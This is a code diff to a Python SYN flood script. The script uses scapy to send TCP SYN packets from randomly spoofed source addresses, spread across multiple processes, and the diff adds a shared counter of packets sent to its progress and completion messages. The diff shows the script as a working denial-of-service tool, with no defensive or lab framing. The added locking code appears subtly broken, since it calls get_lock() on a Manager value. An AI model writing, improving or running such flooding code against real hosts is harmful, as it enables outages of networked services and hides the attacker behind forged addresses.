@@ -13,7 +13,7 @@ def generate_spoofed_ip():
     """Generates a random spoofed IPv4 address."""
     return ".".join(str(random.randint(1, 254)) for _ in range(4))
 
-def syn_flood_worker(target_ip, target_port, running_flag):
+def syn_flood_worker(target_ip, target_port, running_flag, packet_counter):
     """
     Worker function that continuously sends SYN packets directly to the target IP address.
     No MAC resolution required.
@@ -24,6 +24,8 @@ def syn_flood_worker(target_ip, target_port, running_flag):
             src_port = random.randint(1024, 65535)
             packet = IP(src=src_ip, dst=target_ip) / TCP(sport=src_port, dport=target_port, flags="S")
             send(packet, verbose=0)  # Send SYN packet
+            with packet_counter.get_lock():  # Lock for safe access to shared counter
+                packet_counter.value += 1  # Increment the packet counter
         except Exception:
             continue
 
@@ -41,12 +43,15 @@ def main():
     # Create a shared flag to signal processes to stop.
     manager = multiprocessing.Manager()
     running_flag = manager.Value('i', 1)
+    
+    # Create a shared counter to track the number of packets sent
+    packet_counter = manager.Value('i', 0)
 
     processes = []
     print("\n🚀 Starting SYN Flood Attack...")
     for _ in range(num_processes):
         p = multiprocessing.Process(target=syn_flood_worker,
-                                    args=(target_ip, target_port, running_flag))
+                                    args=(target_ip, target_port, running_flag, packet_counter))
         p.start()
         processes.append(p)
 
@@ -54,7 +59,7 @@ def main():
     try:
         while time.time() - start_time < duration:
             elapsed = time.time() - start_time
-            print(f"\rElapsed time: {elapsed:.1f}s", end='', flush=True)
+            print(f"\rElapsed time: {elapsed:.1f}s | Packets sent: {packet_counter.value}", end='', flush=True)
             time.sleep(1)
     except KeyboardInterrupt:
         print("\n🛑 Attack interrupted by user!")
@@ -64,7 +69,7 @@ def main():
             p.terminate()
             p.join()
 
-    print("\n\n📊 Attack finished.")
+    print(f"\n\n📊 Attack finished. Total packets sent: {packet_counter.value}")
 
 if __name__ == "__main__":
     # Set up signal handler for graceful termination.
